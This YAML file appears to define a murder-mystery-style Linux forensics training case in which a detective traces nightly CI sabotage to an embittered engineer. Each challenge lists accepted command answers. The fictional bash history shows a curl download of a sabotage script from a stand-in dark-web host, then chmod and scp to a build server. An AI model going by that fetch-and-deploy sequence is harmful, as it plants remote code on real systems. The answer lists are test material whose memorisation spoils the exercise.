@@ -1,0 +1,382 @@
+# Murder Mystery Case 002: The Phantom Hacker
+# A sabotage investigation
+
+case:
+  id: "case_002"
+  title: "The Phantom Hacker"
+  subtitle: "When Builds Die at Midnight"
+  difficulty: "advanced"
+  estimated_time: "25-35 minutes"
+
+  intro: |
+    Your phone buzzes at 3 AM. Another call from NexGen Systems.
+
+    "Detective Shell, we have a crisis. Our CI/CD pipeline has been
+    sabotaged for the third night in a row. Builds fail at exactly
+    midnight. Deployments get corrupted. We're losing millions."
+
+    "Someone inside is doing this," the CTO whispers. "Find them
+    before our investors pull out tomorrow."
+
+    You boot up your terminal. Time to hunt a ghost in the machine.
+
+  setting: |
+    NexGen Systems - A fintech startup with 200 employees.
+    The sabotage: Builds fail at midnight, deployment scripts corrupted.
+    Pattern: Always happens when no one is watching.
+
+    You have access to their build servers, logs, and employee records.
+    The phantom leaves no obvious traces... or so they think.
+
+suspects:
+  - id: "kevin"
+    name: "Kevin Zhang"
+    role: "Senior DevOps Engineer"
+    description: "10 years experience, recently passed over for promotion"
+    alibi: "Claims he's always home by 6 PM"
+    motive: "Bitter about being passed over for team lead"
+
+  - id: "maria"
+    name: "Maria Santos"
+    role: "Build Engineer"
+    description: "New hire, 3 months in, very eager to prove herself"
+    alibi: "Working late on 'personal projects'"
+    motive: "Unknown - seems too new to have grudges"
+
+  - id: "tom"
+    name: "Tom Bradley"
+    role: "Security Analyst"
+    description: "Paranoid, always talking about vulnerabilities"
+    alibi: "Claims to be monitoring systems from home"
+    motive: "Wants to prove the company needs more security budget"
+
+  - id: "lisa"
+    name: "Lisa Park"
+    role: "Former CTO (now consultant)"
+    description: "Left under unclear circumstances, still has some access"
+    alibi: "At a conference in Europe"
+    motive: "Rumored to be starting a competing company"
+
+scenes:
+  - id: "scene_01"
+    title: "The Build Server"
+    location: "Server Room - Build Cluster"
+    narrative: |
+      You enter the server room. Racks of machines hum in the cold.
+      The build server logs everything - every command, every process.
+
+      "The failures started three weeks ago," the sysadmin explains.
+      "Always at midnight. The builds just... die."
+
+      Time to check what's running on this machine.
+
+    objective: "Investigate running processes and scheduled tasks"
+
+    challenges:
+      - id: "ch_02_01"
+        context: "First, check what processes are currently running with their full command lines"
+        question_type: "command_builder"
+        question: "Show all running processes with full command details (use ps with aux flags)"
+        correct_answers: ["ps aux", "ps -aux", "ps -ef"]
+        hint: "ps with 'aux' shows all processes with details"
+        success_narrative: |
+          The process list reveals something odd:
+
+          USER       PID  COMMAND
+          root      1842  /usr/bin/cron
+          jenkins   2341  java -jar jenkins.war
+          root      9999  /tmp/.hidden/midnight_killer.sh
+
+          Wait - what's that process running from /tmp/.hidden/?
+          A script called "midnight_killer.sh" - that's not suspicious at all!
+        clue_unlocked: "A suspicious script 'midnight_killer.sh' is running from /tmp/.hidden/"
+
+      - id: "ch_02_02"
+        context: "You found a suspicious script. Check the cron jobs to see if it's scheduled"
+        question_type: "command_builder"
+        question: "List all cron jobs for all users (hint: check /etc/crontab or use crontab -l)"
+        correct_answers:
+          - "cat /etc/crontab"
+          - "crontab -l"
+          - "cat /var/spool/cron/crontabs/*"
+        hint: "Cron jobs are stored in /etc/crontab or user-specific crontab files"
+        success_narrative: |
+          The crontab reveals:
+
+          # System crontab
+          0 0 * * * root /tmp/.hidden/midnight_killer.sh
+
+          There it is! A cron job set to run at exactly midnight (0 0 * * *).
+          Someone added this to the system crontab.
+
+          But who has access to modify system cron?
+        clue_unlocked: "The sabotage script is scheduled via cron to run at midnight"
+
+  - id: "scene_02"
+    title: "The Access Logs"
+    location: "Security Operations Center"
+    narrative: |
+      You need to find out who added that cron job.
+      The auth logs track every sudo command and login.
+
+      "We log everything," the security team assures you.
+
+      Let's see who's been using root privileges lately.
+
+    objective: "Trace who modified the cron configuration"
+
+    challenges:
+      - id: "ch_02_03"
+        context: "Check the auth log for sudo commands in the past week"
+        question_type: "command_builder"
+        question: "Search for 'sudo' entries in /var/log/auth.log and show lines with timestamps"
+        correct_answers:
+          - "grep sudo /var/log/auth.log"
+          - "grep 'sudo' /var/log/auth.log"
+          - "cat /var/log/auth.log | grep sudo"
+        hint: "Use grep to filter for 'sudo' in the auth log"
+        success_narrative: |
+          The sudo log shows interesting entries:
+
+          Mar 10 23:45:12 buildserver sudo: kevin.zhang : TTY=pts/0 ; COMMAND=/usr/bin/vim /etc/crontab
+          Mar 10 23:47:33 buildserver sudo: kevin.zhang : TTY=pts/0 ; COMMAND=/bin/mkdir /tmp/.hidden
+          Mar 10 23:48:01 buildserver sudo: kevin.zhang : TTY=pts/0 ; COMMAND=/bin/cp sabotage.sh /tmp/.hidden/midnight_killer.sh
+
+          Kevin Zhang! He edited the crontab and created the hidden directory!
+        clue_unlocked: "Kevin Zhang used sudo to install the sabotage script"
+
+      - id: "ch_02_04"
+        context: "Check Kevin's login history to see his access patterns"
+        question_type: "command_builder"
+        question: "Show the last login history for user kevin.zhang (use the last command)"
+        correct_answers:
+          - "last kevin.zhang"
+          - "last | grep kevin.zhang"
+          - "last kevin"
+        hint: "The 'last' command shows login history, you can filter by username"
+        success_narrative: |
+          Kevin's login history:
+
+          kevin.zhang  pts/0  192.168.1.105  Mar 10 23:42 - 23:55
+          kevin.zhang  pts/0  192.168.1.105  Mar 09 23:30 - 23:48
+          kevin.zhang  pts/0  192.168.1.105  Mar 08 23:35 - 23:52
+
+          He's been logging in late every night from the same IP.
+          But wait - he claims to leave at 6 PM every day!
+        clue_unlocked: "Kevin has been logging in late at night despite claiming otherwise"
+
+  - id: "scene_03"
+    title: "The Network Trail"
+    location: "Network Operations"
+    narrative: |
+      You have Kevin's suspicious login IP: 192.168.1.105
+
+      But is he really at home, or is he using a VPN to hide?
+      The network team can help trace the real source.
+
+      "We have netflow data for the past month," they offer.
+
+    objective: "Trace the true source of Kevin's connection"
+
+    challenges:
+      - id: "ch_02_05"
+        context: "Check the ARP table to find the MAC address for that IP"
+        question_type: "what_does_it_do"
+        question: |
+          What does this command show?
+
+          arp -a | grep 192.168.1.105
+        options:
+          - "The MAC address associated with that IP"
+          - "The open ports on that IP"
+          - "The hostname of that IP"
+          - "The network speed to that IP"
+        correct_answer: "The MAC address associated with that IP"
+        hint: "ARP maps IP addresses to hardware (MAC) addresses"
+        success_narrative: |
+          The ARP lookup reveals:
+
+          ? (192.168.1.105) at 00:1a:2b:3c:4d:5e on en0
+
+          MAC address: 00:1a:2b:3c:4d:5e
+
+          Checking the asset database... this MAC belongs to a laptop
+          registered to Kevin Zhang. It's his company MacBook!
+
+          He IS connecting from his laptop - but from where?
+        clue_unlocked: "The connection comes from Kevin's company laptop"
+
+      - id: "ch_02_06"
+        context: "Analyze DNS queries to see what domains Kevin accessed during his late sessions"
+        question_type: "command_builder"
+        question: "Search for DNS queries from 192.168.1.105 in /var/log/dns.log showing unique domains"
+        correct_answers:
+          - "grep '192.168.1.105' /var/log/dns.log | cut -d' ' -f5 | sort | uniq"
+          - "grep 192.168.1.105 /var/log/dns.log | awk '{print $5}' | sort | uniq"
+        hint: "Use grep to filter by IP, cut or awk to extract the domain field, sort and uniq for unique values"
+        success_narrative: |
+          DNS queries from Kevin's sessions:
+
+          competitor-jobs.com
+          linkedin.com
+          startup-funding.io
+          vengeance-scripts.darkweb.onion
+
+          He's been looking at competitor job sites and...
+          "vengeance-scripts.darkweb.onion"?! That's where he got the sabotage script!
+        clue_unlocked: "Kevin visited 'vengeance-scripts.darkweb.onion' to get sabotage tools"
+
+  - id: "scene_04"
+    title: "The Digital Evidence"
+    location: "Kevin's Workstation"
+    narrative: |
+      With a warrant, you access Kevin's workstation remotely.
+      His desktop is clean, but hackers always leave traces.
+
+      Time to dig through his home directory.
+      The bash history might tell us everything.
+
+    objective: "Find evidence of Kevin's sabotage planning"
+
+    challenges:
+      - id: "ch_02_07"
+        context: "Check Kevin's bash history for suspicious commands"
+        question_type: "command_builder"
+        question: "Read the last 50 lines of Kevin's bash history file (~kevin/.bash_history)"
+        correct_answers:
+          - "tail -50 ~kevin/.bash_history"
+          - "tail -n 50 ~kevin/.bash_history"
+          - "tail -50 /home/kevin/.bash_history"
+        hint: "Use tail with -50 or -n 50 to show the last 50 lines"
+        success_narrative: |
+          Kevin's recent commands:
+
+          curl -O https://vengeance-scripts.onion/midnight_killer.sh
+          chmod +x midnight_killer.sh
+          vim midnight_killer.sh  # customized for NexGen
+          scp midnight_killer.sh buildserver:/tmp/
+          ssh buildserver
+          # ... then the sudo commands we saw earlier
+
+          He downloaded, customized, and deployed the sabotage script!
+        clue_unlocked: "Kevin downloaded the sabotage script from the dark web"
+
+      - id: "ch_02_08"
+        context: "Find any notes or plans Kevin might have written"
+        question_type: "command_builder"
+        question: "Search recursively for files containing 'revenge' or 'sabotage' in Kevin's home directory"
+        correct_answers:
+          - "grep -r 'revenge\\|sabotage' ~kevin/"
+          - "grep -rE 'revenge|sabotage' ~kevin/"
+          - "grep -ri 'revenge' ~kevin/ && grep -ri 'sabotage' ~kevin/"
+        hint: "Use grep -r for recursive search, and \\| or -E for OR patterns"
+        success_narrative: |
+          Found in ~kevin/Documents/.personal/plan.txt:
+
+          "They promoted that idiot Tom over me. 10 years of loyalty
+          and THIS is how they treat me?
+
+          Phase 1: Sabotage builds - DONE
+          Phase 2: Corrupt deployments - IN PROGRESS
+          Phase 3: Delete production database - March 15th
+
+          By the time they figure it out, I'll be at CompetitorCorp
+          with a 50% raise. Burn it all down."
+
+          March 15th is TOMORROW! You need to act fast!
+        clue_unlocked: "Kevin planned to delete the production database on March 15th"
+
+  - id: "scene_05"
+    title: "The Confrontation"
+    location: "Conference Room A"
+    narrative: |
+      Kevin sits across from you, arms crossed, smirking.
+
+      "You can't prove anything," he says.
+
+      "Actually, Kevin, I can prove everything."
+
+      Time to present the evidence chain.
+
+    objective: "Present the evidence and get a confession"
+
+    challenges:
+      - id: "ch_02_09"
+        context: "Final question: What command would permanently remove the cron job?"
+        question_type: "command_builder"
+        question: "Write the command to edit the system crontab and remove the malicious entry"
+        correct_answers:
+          - "sudo crontab -e"
+          - "sudo vim /etc/crontab"
+          - "sudo nano /etc/crontab"
+        hint: "Use sudo with crontab -e or directly edit /etc/crontab"
+        success_narrative: |
+          As you explain how to neutralize his attack, Kevin's smirk fades.
+
+          "The process logs, the sudo history, the DNS queries, your bash
+          history, and your own written confession... it's all there, Kevin."
+
+          He slumps in his chair.
+
+          "They shouldn't have passed me over. I gave them everything."
+
+          "And now you'll give the police everything too."
+        clue_unlocked: "Evidence chain complete - Kevin confessed"
+
+      - id: "ch_02_10"
+        context: "Secure the evidence: Create a compressed archive of all log files"
+        question_type: "command_builder"
+        question: "Create a gzipped tar archive called evidence.tar.gz containing /var/log/auth.log and ~kevin/.bash_history"
+        correct_answers:
+          - "tar -czvf evidence.tar.gz /var/log/auth.log ~kevin/.bash_history"
+          - "tar czvf evidence.tar.gz /var/log/auth.log ~kevin/.bash_history"
+          - "tar -czf evidence.tar.gz /var/log/auth.log ~kevin/.bash_history"
+        hint: "tar with -c (create), -z (gzip), -v (verbose), -f (file) followed by the archive name and files"
+        success_narrative: |
+          Evidence archived and secured.
+
+          Kevin is escorted out by security. His access is revoked.
+          The production database is safe.
+
+          "You saved us," the CTO says. "How can we ever thank you?"
+
+          "Just keep better audit logs," you reply.
+        clue_unlocked: "Evidence secured, case closed"
+
+conclusion:
+  success: |
+    CASE CLOSED
+
+    Kevin Zhang was arrested for computer sabotage and attempted
+    destruction of corporate data. His plan to delete the production
+    database was thwarted just 18 hours before execution.
+
+    The evidence trail was clear:
+    - Process listing revealed the sabotage script
+    - Cron jobs showed the midnight execution
+    - Auth logs traced the sudo commands to Kevin
+    - Login history proved his late-night access
+    - Bash history showed he downloaded the attack tools
+    - His own notes detailed the entire revenge plan
+
+    Evidence collected: {clues_found}/{total_clues}
+    Time taken: {time_taken}
+
+    "The logs never lie," you think, closing your laptop.
+    Another phantom caught.
+
+  failure: |
+    The evidence was incomplete. Kevin noticed the investigation
+    and wiped his tracks before you could build a solid case.
+
+    The sabotage continues. The database was deleted.
+    NexGen Systems filed for bankruptcy.
+
+    Better log analysis skills might have saved them.
+    Keep practicing, Detective.
+
+rewards:
+  xp: 600
+  achievement: "phantom_hunter"
+  achievement_name: "Phantom Hunter"
+  achievement_description: "Caught the phantom hacker through log analysis"
